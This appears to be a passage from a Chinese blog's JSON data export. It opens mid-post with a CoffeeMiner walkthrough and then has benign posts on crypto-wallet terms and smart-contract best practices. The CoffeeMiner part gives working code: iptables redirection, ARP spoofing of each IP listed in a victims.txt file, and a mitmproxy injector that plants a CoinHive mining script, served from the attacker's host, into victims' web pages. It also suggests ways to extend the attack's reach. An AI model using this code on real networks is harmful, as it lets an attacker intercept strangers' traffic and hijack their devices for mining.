PoW哈希算法来挖掘基于CryptoNote协议的门罗币.不过CoinHive的执行要在网站的运行时间超过四十秒时才会有效，如果用户意识到自己打开了一个有问题的页面，立马关闭，则CoinHive就会运行失败.</p>\n<h2 id=\"2-CoffeeMiner的运行\"><a href=\"#2-CoffeeMiner的运行\" class=\"headerlink\" title=\"2.CoffeeMiner的运行\"></a>2.CoffeeMiner的运行</h2><p>在以上这些条件准备好以后，开始执行CoffeeMiner，进而让CoffeeMiner脚本执行ARPspoofing攻击，并用mitmproxy将CoinHive cryptominer注入受害者的HTML页面。<br>为此，需要首先配置ip_forwarding和IPTABLES，以便将攻击者的设备转换为代理。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class=\"line\">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class=\"line\">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</span><br></pre></td></tr></table></figure>\n<p>为了对所有受害者执行ARP欺骗，我将为受害者的所有IP准备一个“victim.txt”文件。不过要读取所有受害者IP，就准备一些Python行，它将获得IP（以及命令行参数中的网关IP），并对每个受害者的IP执行ARP欺骗。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gateway = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">print(<span class=\"string\">\"gateway: \"</span> + gateway)</span><br><span class=\"line\"><span class=\"comment\"># get victims_ip</span></span><br><span class=\"line\">victims = [line.rstrip(<span class=\"string\">'n'</span>) <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> open(<span class=\"string\">\"victims.txt\"</span>)]</span><br><span class=\"line\">print(<span class=\"string\">\"victims:\"</span>)</span><br><span class=\"line\">print(victims)</span><br><span class=\"line\"><span class=\"comment\"># run the arpspoof for each victim, each one in a new console</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> victim <span class=\"keyword\">in</span> victims:</span><br><span class=\"line\">    os.system(<span class=\"string\">\"xterm -e arpspoof -i eth0 -t \"</span> + victim + <span class=\"string\">\" \"</span> + gateway + <span class=\"string\">\" &amp;\"</span>)</span><br><span class=\"line\">    os.system(<span class=\"string\">\"xterm -e arpspoof -i eth0 -t \"</span> + gateway + <span class=\"string\">\" \"</span> + victim + <span class=\"string\">\" &amp;\"</span>)</span><br></pre></td></tr></table></figure></p>\n<p>一旦执行了ARP欺骗，只需要运行HTTP服务器即可.<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; python3 httpServer.py</span><br></pre></td></tr></table></figure></p>\n<p>现在，可以用injector.py运行mitmproxy了.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; mitmdump -s <span class=\"string\">'injector.py http://httpserverIP:8080/script.js'</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"3-CoffeeMiner的最终挖矿脚本\"><a href=\"#3-CoffeeMiner的最终挖矿脚本\" class=\"headerlink\" title=\"3.CoffeeMiner的最终挖矿脚本\"></a>3.CoffeeMiner的最终挖矿脚本</h2><p>现在把上面解释的所有概念都放在’coffeeMiner.py’脚本中：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"comment\">#get gateway_ip (router)</span></span><br><span class=\"line\">gateway = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">print(<span class=\"string\">\"gateway: \"</span> + gateway)</span><br><span class=\"line\"><span class=\"comment\"># get victims_ip</span></span><br><span class=\"line\">victims = [line.rstrip(<span class=\"string\">'n'</span>) <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> open(<span class=\"string\">\"victims.txt\"</span>)]</span><br><span class=\"line\">print(<span class=\"string\">\"victims:\"</span>)</span><br><span class=\"line\">print(victims)</span><br><span class=\"line\"><span class=\"comment\"># configure routing (IPTABLES)</span></span><br><span class=\"line\">os.system(<span class=\"string\">\"echo 1 &gt; /proc/sys/net/ipv4/ip_forward\"</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">\"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\"</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">\"iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\"</span>)</span><br><span class=\"line\">os.system(<span class=\"string\">\"iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># run the arpspoof for each victim, each one in a new console</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> victim <span class=\"keyword\">in</span> victims:</span><br><span class=\"line\">    os.system(<span class=\"string\">\"xterm -e arpspoof -i eth0 -t \"</span> + victim + <span class=\"string\">\" \"</span> + gateway + <span class=\"string\">\" &amp;\"</span>)</span><br><span class=\"line\">    os.system(<span class=\"string\">\"xterm -e arpspoof -i eth0 -t \"</span> + gateway + <span class=\"string\">\" \"</span> + victim + <span class=\"string\">\" &amp;\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># start the http server for serving the script.js, in a new console</span></span><br><span class=\"line\">os.system(<span class=\"string\">\"xterm -hold -e 'python3 httpServer.py' &amp;\"</span>)</span><br><span class=\"line\"><span class=\"comment\"># start the mitmproxy</span></span><br><span class=\"line\">os.system(<span class=\"string\">\"~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T\"</span>)</span><br></pre></td></tr></table></figure></p>\n<p>在’injector.py’脚本中：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">from</span> mitmproxy <span class=\"keyword\">import</span> ctx, http</span><br><span class=\"line\"><span class=\"keyword\">import</span> argparse</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Injector</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, path)</span>:</span></span><br><span class=\"line\">        self.path = path</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">response</span><span class=\"params\">(self, flow: http.HTTPFlow)</span> -&gt; <span class=\"keyword\">None</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.path:</span><br><span class=\"line\">            html = BeautifulSoup(flow.response.content, <span class=\"string\">\"html.parser\"</span>)</span><br><span class=\"line\">            print(self.path)</span><br><span class=\"line\">            print(flow.response.headers[<span class=\"string\">\"content-type\"</span>])</span><br><span class=\"line\">            <span class=\"keyword\">if</span> flow.response.headers[<span class=\"string\">\"content-type\"</span>] == <span class=\"string\">'text/html'</span>:</span><br><span class=\"line\">                print(flow.response.headers[<span class=\"string\">\"content-type\"</span>])</span><br><span class=\"line\">                script = html.new_tag(</span><br><span class=\"line\">                    <span class=\"string\">\"script\"</span>,</span><br><span class=\"line\">                    src=self.path,</span><br><span class=\"line\">                    type=<span class=\"string\">'application/javascript'</span>)</span><br><span class=\"line\">                html.body.insert(<span class=\"number\">0</span>, script)</span><br><span class=\"line\">                flow.response.content = str(html).encode(<span class=\"string\">\"utf8\"</span>)</span><br><span class=\"line\">                print(<span class=\"string\">\"Script injected.\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">start</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = argparse.ArgumentParser()</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">\"path\"</span>, type=str)</span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Injector(args.path)</span><br></pre></td></tr></table></figure></p>\n<p>要执行挖矿，只需要执行以下操作：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; python3 coffeeMiner.py RouterIP</span><br></pre></td></tr></table></figure></p>\n<p>当然也可以手动运行.</p>\n<p><img src=\"/images/coffeeMiner-demo-cutted.gif\" alt=\"\"></p>\n<h2 id=\"结论\"><a href=\"#结论\" class=\"headerlink\" title=\"结论\"></a>结论</h2><p>正如我们所看到的，攻击者可以轻松执行，也可以部署为WiFi网络中的自主攻击.</p>\n<p>另一个想到的是，对于真实世界的WiFi网络来说，使用强大的WiFi天线执行攻击过程，以扩大攻击范围.</p>\n<p>虽然攻击者主要目标是执行自主攻击，但我们仍然需要使用受害设备的IP地址编辑victim.txt文件. 对于更多版本，可能的功能可能是添加自主的Nmap扫描，将检测到的IP添加到CoffeeMiner受害者列表中. 另一个功能，可能是添加sslstrip，以确保注入也在用户可以通过HTTPS请求的网站中.</p>\n<p>附:完整的攻击代码：https：//github.com/arnaucode/coffeeMiner</p>\n"},{"title":"手机钱包常见名词解释","comments":0,"date":"2018-03-11T00:44:06.000Z","img":null,"_content":"\n在使用imtoken的时候创建一个钱包的的流程如下\n\n![](/images/wallet.jpeg)\n这里涉及到的几个名词:\n* **用户名**、\n* **密码**、\n* **钱包地址**、\n* **私钥**、\n* **Keystore**、\n* **助记词**\n\n这些分别是什么呢？又有些什么作用呢?\n\n### 1.用户名：\n\n首先从用户名说起，用户名就是我们给不同钱包起的一个名字，如果没有用户名的话区分不同钱包就应该是用地址来区分了，地址是一个以0x开头的，42位的16进制数，相对来说是不好记忆更不方便我们区分钱包。\n\n### 2.密码：\n\n密码的作用是保护钱包安全的。所有的敏感操作都要使用密码才能进行。\n\t\t\t\t\t    \n用途：\n1.导出私钥时候使用，\n2.导入导出keystore时使用，\n3.导出助记词时候使用，\n4.转账的时候使用\n\t\t\t\t\t\t\t\t\t\t    \n*注意*：\n\n密码只是存在本地的，也就是说同一个钱包在A手机上设置了一个密码，导入B手机中并不需要设置和A手机中的密码一样。\n\n### 3.钱包地址：\n钱包地址是一个以0x开头的十六进制的四十二位数。一个钱包只有一个地址。就相当于银行卡的银行卡号。\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n用途：\n1：你给别人转账的时候就是通过对方的钱包地址。\n2：查询转账记录也是通过钱包地址来查询的。\n\n### 4.私钥：\n私钥是在创建钱包时候生成的。他是一个64 位 16 进制的哈希值字符串，例如：“ad025560b0db0bef204a12f67407d485661737698c62b345a84fc1aedf9ce7f9”。一个钱包对应一个私钥并且不能修改。私钥决定了钱包的所有权，可以通过密码导出私钥，也可以通过私钥把钱包导入另一个手机中去。\n\n*注意：*\n通过A手机把私钥导出，然后再导入B手机中设置密码，密码不需要和A手机中的密码相同，就可以操作对应的钱包，所以私钥不要随便暴露给别人。\n\n### 5.Keystore:\n文件是以太坊钱包存储私钥的一种文件格式 (JSON)，keystore相当于加密后的私钥，和私钥的用途是相同的，在A手机通过密码导出keystore，然后通过密码和keystore可以把钱包导入B手机中。但是使用方法有些许不同，通过秘钥导入可以在B手机随便设置密码，而通过keystore导入的时候必须使用导出时候用到的密码。也就是生成的keystore和生成时候的密码相匹配。如果密码丢失你也失去了对keystore的控制权。\n\n### 6.助记词：\n\n助记词，可以在第一次创建账户后导出，助记词是私钥的另一种表现形式，助记词一般由12、15、18、21个单词构成，他的作用和私钥是一样的。拿到助记词可以把钱包导入手机，操作钱包。\n\n**注意**：\n\n私钥=助记词=keystory+密码，私钥，助记词，keystory一定要妥善保管，可以通过他们三个任何一个都可以把钱包备份到另一个设备导入另一个设备，如果丢失只能尽快把钱包中的币转入安全的钱包中。\n","source":"_posts/手机钱包常见名词解释.md","raw":"---\ntitle: 手机钱包常见名词解释\ncomments: false\ndate: 2018-03-11 8:44:06\ncategories: 钱包\ntags: \n- ciscolxh \n- 钱包\nimg:\n---\n\n在使用imtoken的时候创建一个钱包的的流程如下\n\n![](/images/wallet.jpeg)\n这里涉及到的几个名词:\n* **用户名**、\n* **密码**、\n* **钱包地址**、\n* **私钥**、\n* **Keystore**、\n* **助记词**\n\n这些分别是什么呢？又有些什么作用呢?\n\n### 1.用户名：\n\n首先从用户名说起，用户名就是我们给不同钱包起的一个名字，如果没有用户名的话区分不同钱包就应该是用地址来区分了，地址是一个以0x开头的，42位的16进制数，相对来说是不好记忆更不方便我们区分钱包。\n\n### 2.密码：\n\n密码的作用是保护钱包安全的。所有的敏感操作都要使用密码才能进行。\n\t\t\t\t\t    \n用途：\n1.导出私钥时候使用，\n2.导入导出keystore时使用，\n3.导出助记词时候使用，\n4.转账的时候使用\n\t\t\t\t\t\t\t\t\t\t    \n*注意*：\n\n密码只是存在本地的，也就是说同一个钱包在A手机上设置了一个密码，导入B手机中并不需要设置和A手机中的密码一样。\n\n### 3.钱包地址：\n钱包地址是一个以0x开头的十六进制的四十二位数。一个钱包只有一个地址。就相当于银行卡的银行卡号。\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\n用途：\n1：你给别人转账的时候就是通过对方的钱包地址。\n2：查询转账记录也是通过钱包地址来查询的。\n\n### 4.私钥：\n私钥是在创建钱包时候生成的。他是一个64 位 16 进制的哈希值字符串，例如：“ad025560b0db0bef204a12f67407d485661737698c62b345a84fc1aedf9ce7f9”。一个钱包对应一个私钥并且不能修改。私钥决定了钱包的所有权，可以通过密码导出私钥，也可以通过私钥把钱包导入另一个手机中去。\n\n*注意：*\n通过A手机把私钥导出，然后再导入B手机中设置密码，密码不需要和A手机中的密码相同，就可以操作对应的钱包，所以私钥不要随便暴露给别人。\n\n### 5.Keystore:\n文件是以太坊钱包存储私钥的一种文件格式 (JSON)，keystore相当于加密后的私钥，和私钥的用途是相同的，在A手机通过密码导出keystore，然后通过密码和keystore可以把钱包导入B手机中。但是使用方法有些许不同，通过秘钥导入可以在B手机随便设置密码，而通过keystore导入的时候必须使用导出时候用到的密码。也就是生成的keystore和生成时候的密码相匹配。如果密码丢失你也失去了对keystore的控制权。\n\n### 6.助记词：\n\n助记词，可以在第一次创建账户后导出，助记词是私钥的另一种表现形式，助记词一般由12、15、18、21个单词构成，他的作用和私钥是一样的。拿到助记词可以把钱包导入手机，操作钱包。\n\n**注意**：\n\n私钥=助记词=keystory+密码，私钥，助记词，keystory一定要妥善保管，可以通过他们三个任何一个都可以把钱包备份到另一个设备导入另一个设备，如果丢失只能尽快把钱包中的币转入安全的钱包中。\n","slug":"手机钱包常见名词解释","published":1,"updated":"2018-03-11T01:08:12.881Z","layout":"post","photos":[],"link":"","_id":"cjf7piavn0010pkwogiujtx35","content":"<p>在使用imtoken的时候创建一个钱包的的流程如下</p>\n<p><img src=\"/images/wallet.jpeg\" alt=\"\"><br>这里涉及到的几个名词:</p>\n<ul>\n<li><strong>用户名</strong>、</li>\n<li><strong>密码</strong>、</li>\n<li><strong>钱包地址</strong>、</li>\n<li><strong>私钥</strong>、</li>\n<li><strong>Keystore</strong>、</li>\n<li><strong>助记词</strong></li>\n</ul>\n<p>这些分别是什么呢？又有些什么作用呢?</p>\n<h3 id=\"1-用户名：\"><a href=\"#1-用户名：\" class=\"headerlink\" title=\"1.用户名：\"></a>1.用户名：</h3><p>首先从用户名说起，用户名就是我们给不同钱包起的一个名字，如果没有用户名的话区分不同钱包就应该是用地址来区分了，地址是一个以0x开头的，42位的16进制数，相对来说是不好记忆更不方便我们区分钱包。</p>\n<h3 id=\"2-密码：\"><a href=\"#2-密码：\" class=\"headerlink\" title=\"2.密码：\"></a>2.密码：</h3><p>密码的作用是保护钱包安全的。所有的敏感操作都要使用密码才能进行。</p>\n<p>用途：<br>1.导出私钥时候使用，<br>2.导入导出keystore时使用，<br>3.导出助记词时候使用，<br>4.转账的时候使用</p>\n<p><em>注意</em>：</p>\n<p>密码只是存在本地的，也就是说同一个钱包在A手机上设置了一个密码，导入B手机中并不需要设置和A手机中的密码一样。</p>\n<h3 id=\"3-钱包地址：\"><a href=\"#3-钱包地址：\" class=\"headerlink\" title=\"3.钱包地址：\"></a>3.钱包地址：</h3><p>钱包地址是一个以0x开头的十六进制的四十二位数。一个钱包只有一个地址。就相当于银行卡的银行卡号。</p>\n<p>用途：<br>1：你给别人转账的时候就是通过对方的钱包地址。<br>2：查询转账记录也是通过钱包地址来查询的。</p>\n<h3 id=\"4-私钥：\"><a href=\"#4-私钥：\" class=\"headerlink\" title=\"4.私钥：\"></a>4.私钥：</h3><p>私钥是在创建钱包时候生成的。他是一个64 位 16 进制的哈希值字符串，例如：“ad025560b0db0bef204a12f67407d485661737698c62b345a84fc1aedf9ce7f9”。一个钱包对应一个私钥并且不能修改。私钥决定了钱包的所有权，可以通过密码导出私钥，也可以通过私钥把钱包导入另一个手机中去。</p>\n<p><em>注意：</em><br>通过A手机把私钥导出，然后再导入B手机中设置密码，密码不需要和A手机中的密码相同，就可以操作对应的钱包，所以私钥不要随便暴露给别人。</p>\n<h3 id=\"5-Keystore\"><a href=\"#5-Keystore\" class=\"headerlink\" title=\"5.Keystore:\"></a>5.Keystore:</h3><p>文件是以太坊钱包存储私钥的一种文件格式 (JSON)，keystore相当于加密后的私钥，和私钥的用途是相同的，在A手机通过密码导出keystore，然后通过密码和keystore可以把钱包导入B手机中。但是使用方法有些许不同，通过秘钥导入可以在B手机随便设置密码，而通过keystore导入的时候必须使用导出时候用到的密码。也就是生成的keystore和生成时候的密码相匹配。如果密码丢失你也失去了对keystore的控制权。</p>\n<h3 id=\"6-助记词：\"><a href=\"#6-助记词：\" class=\"headerlink\" title=\"6.助记词：\"></a>6.助记词：</h3><p>助记词，可以在第一次创建账户后导出，助记词是私钥的另一种表现形式，助记词一般由12、15、18、21个单词构成，他的作用和私钥是一样的。拿到助记词可以把钱包导入手机，操作钱包。</p>\n<p><strong>注意</strong>：</p>\n<p>私钥=助记词=keystory+密码，私钥，助记词，keystory一定要妥善保管，可以通过他们三个任何一个都可以把钱包备份到另一个设备导入另一个设备，如果丢失只能尽快把钱包中的币转入安全的钱包中。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在使用imtoken的时候创建一个钱包的的流程如下</p>\n<p><img src=\"/images/wallet.jpeg\" alt=\"\"><br>这里涉及到的几个名词:</p>\n<ul>\n<li><strong>用户名</strong>、</li>\n<li><strong>密码</strong>、</li>\n<li><strong>钱包地址</strong>、</li>\n<li><strong>私钥</strong>、</li>\n<li><strong>Keystore</strong>、</li>\n<li><strong>助记词</strong></li>\n</ul>\n<p>这些分别是什么呢？又有些什么作用呢?</p>\n<h3 id=\"1-用户名：\"><a href=\"#1-用户名：\" class=\"headerlink\" title=\"1.用户名：\"></a>1.用户名：</h3><p>首先从用户名说起，用户名就是我们给不同钱包起的一个名字，如果没有用户名的话区分不同钱包就应该是用地址来区分了，地址是一个以0x开头的，42位的16进制数，相对来说是不好记忆更不方便我们区分钱包。</p>\n<h3 id=\"2-密码：\"><a href=\"#2-密码：\" class=\"headerlink\" title=\"2.密码：\"></a>2.密码：</h3><p>密码的作用是保护钱包安全的。所有的敏感操作都要使用密码才能进行。</p>\n<p>用途：<br>1.导出私钥时候使用，<br>2.导入导出keystore时使用，<br>3.导出助记词时候使用，<br>4.转账的时候使用</p>\n<p><em>注意</em>：</p>\n<p>密码只是存在本地的，也就是说同一个钱包在A手机上设置了一个密码，导入B手机中并不需要设置和A手机中的密码一样。</p>\n<h3 id=\"3-钱包地址：\"><a href=\"#3-钱包地址：\" class=\"headerlink\" title=\"3.钱包地址：\"></a>3.钱包地址：</h3><p>钱包地址是一个以0x开头的十六进制的四十二位数。一个钱包只有一个地址。就相当于银行卡的银行卡号。</p>\n<p>用途：<br>1：你给别人转账的时候就是通过对方的钱包地址。<br>2：查询转账记录也是通过钱包地址来查询的。</p>\n<h3 id=\"4-私钥：\"><a href=\"#4-私钥：\" class=\"headerlink\" title=\"4.私钥：\"></a>4.私钥：</h3><p>私钥是在创建钱包时候生成的。他是一个64 位 16 进制的哈希值字符串，例如：“ad025560b0db0bef204a12f67407d485661737698c62b345a84fc1aedf9ce7f9”。一个钱包对应一个私钥并且不能修改。私钥决定了钱包的所有权，可以通过密码导出私钥，也可以通过私钥把钱包导入另一个手机中去。</p>\n<p><em>注意：</em><br>通过A手机把私钥导出，然后再导入B手机中设置密码，密码不需要和A手机中的密码相同，就可以操作对应的钱包，所以私钥不要随便暴露给别人。</p>\n<h3 id=\"5-Keystore\"><a href=\"#5-Keystore\" class=\"headerlink\" title=\"5.Keystore:\"></a>5.Keystore:</h3><p>文件是以太坊钱包存储私钥的一种文件格式 (JSON)，keystore相当于加密后的私钥，和私钥的用途是相同的，在A手机通过密码导出keystore，然后通过密码和keystore可以把钱包导入B手机中。但是使用方法有些许不同，通过秘钥导入可以在B手机随便设置密码，而通过keystore导入的时候必须使用导出时候用到的密码。也就是生成的keystore和生成时候的密码相匹配。如果密码丢失你也失去了对keystore的控制权。</p>\n<h3 id=\"6-助记词：\"><a href=\"#6-助记词：\" class=\"headerlink\" title=\"6.助记词：\"></a>6.助记词：</h3><p>助记词，可以在第一次创建账户后导出，助记词是私钥的另一种表现形式，助记词一般由12、15、18、21个单词构成，他的作用和私钥是一样的。拿到助记词可以把钱包导入手机，操作钱包。</p>\n<p><strong>注意</strong>：</p>\n<p>私钥=助记词=keystory+密码，私钥，助记词，keystory一定要妥善保管，可以通过他们三个任何一个都可以把钱包备份到另一个设备导入另一个设备，如果丢失只能尽快把钱包中的币转入安全的钱包中。</p>\n"},{"title":"智能合约最佳实践翻译一","comments":0,"date":"2018-03-09T03:06:28.000Z","img":null,"_content":"\n[原文链接](https://consensys.github.io/smart-contract-best-practices/general_philosophy/)\n\n## 常规理念\n\n以太坊和复杂的区块链编程是崭新的和高度实验性的。 因此，随着新 bug 和安全风险的发现，您应该预期到安全形势会不断发生变化，并制定新的最佳实践。 因此，遵循本文档中的安全措施只是作为智能合约开发人员需要做的安全工作的开始。\n\n智能合约编程需要一个与您过往习惯不同的工程思维。失败的代价可能很高，并且更改可能很困难，使得它在某些方面更像硬件编程或金融服务编程，而不是 Web 或移动开发。因此，防御已知的漏洞是不够的。相反，你需要学习一种新的开发理念：\n\n### 做好失败的准备\n\n任何不平凡的（non-trivial）合约中都有错误。因此你的代码必须能够优雅地反馈 Bug 和漏洞。\n\n* 当出现错误时暂停该合约（“电路中断者”） \n* 管理风险金额（限制比例，设置最大使用量）\n* 为错误修正和改进提供有效的升级途径\n\n### 小心地推出\n\n在完整的产品发布前捕获错误总是更好。彻底地测试合约，并在每次发现新的攻击媒介时添加新的测试 - 从 alpha 测试网络起就提供 Bug 悬赏 - 随着每个阶段的使用和测试推出。\n\n### 保持合约简单\n\n复杂性增加错误的可能性。\n\n* 确定合约的逻辑简单\n* 通过模块化使得合约和函数小巧\n* 在可以使用的地方使用已经存在的工具或者代码（比如，不要使用你自己写的随机数生成器）\n* 只要有可能，请尽量保持清晰\n* 只对你的系统中需要去中心化的部分使用区块链\n\n### 保持更新\n\n使用下一节中列出的资源跟踪新的安全开发。\n\n* 检测你的合同是否有任何新发现的 bug\n* 尽可能快的将工具或者类库更新到最新的版本\n* 接受新的使用的安全技术\n\n### 注意区块链的属性\n\n虽然你的编程经验大部分将与以太坊编程相关，但有一些陷阱需要注意。\n* 要非常小心外部合约的调用，这可能会执行恶意代码并更改控制流。\n* 了解你的公共函数是公开的，可能会被恶意地调用。任何人都可以查看您的私人数据。\n* 记住燃料的消耗和区块燃料的限制。\n\n### 基本权衡：简单与复杂的实例\n\n在评估智能合约系统的结构和安全性时，需要考虑多个基本的权衡。任何智能合约系统的常规建议是在这些基本的权衡之间找到合适的平衡点。\n\n从软件工程来说，理想的智能合约系统是模块化的，复用代码而不是复制代码，并且支持组建可升级。从安全架构来看，一个理想的智能合约要分享它的观念模式，特别是复杂的智能合约系统。\n\n但是，也存在着软件工程和安全不能保持一致的重要的例外。在这些情况下，通过顺着合约系统的维度的最佳组合获得合适的平衡点，比如：\n\n* 静态 与 可升级\n* 整体 与 模块化\n* 重复 与 复用\n\n### 静态和可升级\n\n尽管包括这个在内的多种资源强调拓展特性，例如可删除，可升级或者可修改的模式，但在可塑性和安全性之间还是需要一个基本的平衡。\n\n根据定义，可塑性模式增加了复杂性和潜在的被攻击可能性。在智能合约系统在预定义的有限时间段内执行非常有限的一组功能的情况下，简单性比复杂性更有效率，例如，无管理的有限时间帧令牌销售合约系统。\n\n### 单一整体和模块化\n\n一个单一的只有自身的合约保证了所有的内容都可以在自身被识别与读取。尽管几乎很少有被高度重视的智能合约系统作为一个庞然大物单独存在，但是也有一个理由极端地要求数据和流程在本地 - 例如，优化代码审查效率的情况下。\n\n与在此考虑的其他平衡一样，安全最佳实践趋向于在简单短期合约中的使用软件工程最佳实践，以及在更复杂更长久的合约系统中趋向于软件工程最佳实践。\n\n### 复制与复用\n\n从软件工程的角度看，智能合约系统希望在合理的情况下最大限度地提高重用率。在 Solidity 中有很多方法可以重用合约代码。使用自己拥有的经过验证的已经被部署了的合约通常是实现代码复用的最安全方式。\n\n在自己之前已经部署的合约不可用的情况下，通常就会依赖复制。Live Libs 和 Zeppelin Solidity 等努力试图提供一些模式，一遍复用安全代码而不是复制。任何合约安全分析必须包含之前没有建立与目标智能合约系统中的资金风险相当的信任等级的任何复用的代码。\n","source":"_posts/智能合约最佳实践翻译一.md","raw":"---\ntitle: 智能合约最佳实践翻译一\ncomments: false\ndate: 2018-03-09 11:06:28\ncategories: 智能合约\ntags: \n- ZhouFyk\n- 以太坊\n- 智能合约\n- 安全开发\nimg:\n---\n\n[原文链接](https://consensys.github.io/smart-contract-best-practices/general_philosophy/)\n\n## 常规理念\n\n以太坊和复杂的区块链编程是崭新的和高度实验性的。 因此，随着新 bug 和安全风险的发现，您应该预期到安全形势会不断发生变化，并制定新的最佳实践。 因此，遵循本文档中的安全措施只是作为智能合约开发人员需要做的安全工作的开始。\n\n智能合约编程需要一个与您过往习惯不同的工程思维。失败的代价可能很高，并且更改可能很困难，使得它在某些方面更像硬件编程或金融服务编程，而不是 Web 或移动开发。因此，防御已知的漏洞是不够的。相反，你需要学习一种新的开发理念：\n\n### 做好失败的准备\n\n任何不平凡的（non-trivial）合约中都有错误。因此你的代码必须能够优雅地反馈 Bug 和漏洞。\n\n* 当出现错误时暂停该合约（“电路中断者”） \n* 管理风险金额（限制比例，设置最大使用量）\n* 为错误修正和改进提供有效的升级途径\n\n### 小心地推出\n\n在完整的产品发布前捕获错误总是更好。彻底地测试合约，并在每次发现新的攻击媒介时添加新的测试 - 从 alpha 测试网络起就提供 Bug 悬赏 - 随着每个阶段的使用和测试推出。\n\n### 保持合约简单\n\n复杂性增加错误的可能性。\n\n* 确定合约的逻辑简单\n* 通过模块化使得合约和函数小巧\n* 在可以使用的地方使用已经存在的工具或者代码（比如，不要使用你自己写的随机数生成器）\n* 只要有可能，请尽量保持清晰\n* 只对你的系统中需要去中心化的部分使用区块链\n\n### 保持更新\n\n使用下一节中列出的资源跟踪新的安全开发。\n\n* 检测你的合同是否有任何新发现的 bug\n* 尽可能快的将工具或者类库更新到最新的版本\n* 接受新的使用的安全技术\n\n### 注意区块链的属性\n\n虽然你的编程经验大部分将与以太坊编程相关，但有一些陷阱需要注意。\n* 要非常小心外部合约的调用，这可能会执行恶意代码并更改控制流。\n* 了解你的公共函数是公开的，可能会被恶意地调用。任何人都可以查看您的私人数据。\n* 记住燃料的消耗和区块燃料的限制。\n\n### 